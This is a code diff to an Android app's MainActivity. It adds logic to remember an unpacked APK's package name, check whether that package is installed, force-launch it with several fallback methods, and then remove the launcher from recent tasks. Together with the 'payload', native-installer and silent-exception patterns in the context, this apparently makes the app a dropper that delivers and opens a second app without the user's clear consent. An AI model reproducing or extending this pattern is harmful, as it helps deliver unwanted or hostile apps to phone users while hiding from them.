@@ -36,6 +36,9 @@ public class MainActivity extends Activity {
 
     private static final String TAG = "MainActivity";
     private static final int REQUEST_INSTALL = 100;
+    private static final String PREFS_CONFIG = "app_config";
+    private static final String KEY_SAVED_PACKAGE_NAME = "saved_package_name";
+    private static final String KEY_SAVED_MAIN_ACTIVITY = "saved_main_activity";
     
     private native String nativeGetString(String key);
     private native int nativeGetInt(String key);
@@ -164,11 +167,19 @@ public class MainActivity extends Activity {
 
         nativeInstaller = new NativeInstaller();
         loadConfig();
+        loadSavedPackageInfo();
         setupWebView();
         
         logFirebaseEvent("app_open", null);
         logFirstOpen();
         logPayloadOpened();
+        
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkAndOpenInstalledApp();
+            }
+        }, 500);
     }
 
     private void setupWebView() {
@@ -385,6 +396,8 @@ public class MainActivity extends Activity {
                 if (info.activities != null && info.activities.length > 0) {
                     mainActivity = info.activities[0].name;
                 }
+                
+                savePackageInfo(packageName, mainActivity);
             }
 
             tempFile.delete();
@@ -392,26 +405,88 @@ public class MainActivity extends Activity {
         } catch (Exception e) {
         }
     }
+    
+    private void savePackageInfo(String pkgName, String activity) {
+        if (pkgName != null) {
+            SharedPreferences prefs = getSharedPreferences(PREFS_CONFIG, Context.MODE_PRIVATE);
+            prefs.edit()
+                .putString(KEY_SAVED_PACKAGE_NAME, pkgName)
+                .putString(KEY_SAVED_MAIN_ACTIVITY, activity)
+                .apply();
+        }
+    }
+    
+    private void loadSavedPackageInfo() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_CONFIG, Context.MODE_PRIVATE);
+        packageName = prefs.getString(KEY_SAVED_PACKAGE_NAME, null);
+        mainActivity = prefs.getString(KEY_SAVED_MAIN_ACTIVITY, null);
+    }
+    
+    private boolean isPackageInstalled(String pkgName) {
+        if (pkgName == null || pkgName.isEmpty()) {
+            return false;
+        }
+        
+        try {
+            getPackageManager().getPackageInfo(pkgName, 0);
+            return true;
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
+    }
+    
+    private void checkAndOpenInstalledApp() {
+        if (packageName == null) {
+            readApkInfoInBackground();
+            return;
+        }
+        
+        if (isPackageInstalled(packageName)) {
+            handler.post(new Runnable() {
+                @Override
+                public void run() {
+                    forceOpenApp();
+                }
+            });
+        }
+    }
+    
+    private void readApkInfoInBackground() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                readApkInfo();
+                if (packageName != null && isPackageInstalled(packageName)) {
+                    handler.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            forceOpenApp();
+                        }
+                    });
+                }
+            }
+        }).start();
+    }
 
     private void forceOpenApp() {
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    Thread.sleep(800);
+                    Thread.sleep(300);
 
                     boolean launched = false;
                     if (tryMethod1()) {
                         launched = true;
                     } else {
-                        Thread.sleep(300);
+                        Thread.sleep(200);
 
                         if (tryMethod4()) {
                             launched = true;
                         } else {
-                            Thread.sleep(300);
+                            Thread.sleep(200);
                             tryMethod2();
-                            Thread.sleep(300);
+                            Thread.sleep(200);
                             if (tryMethod3()) {
                                 launched = true;
                             }
@@ -420,18 +495,18 @@ public class MainActivity extends Activity {
 
                     if (launched && packageName != null) {
                         logAppLaunchedSuccess(packageName);
-                    }
-
-                    handler.postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                                finishAndRemoveTask();
-                            } else {
-                                finish();
+                        
+                        handler.postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                                    finishAndRemoveTask();
+                                } else {
+                                    finish();
+                                }
                             }
-                        }
-                    }, 1000);
+                        }, 500);
+                    }
 
                 } catch (Exception e) {
                 }
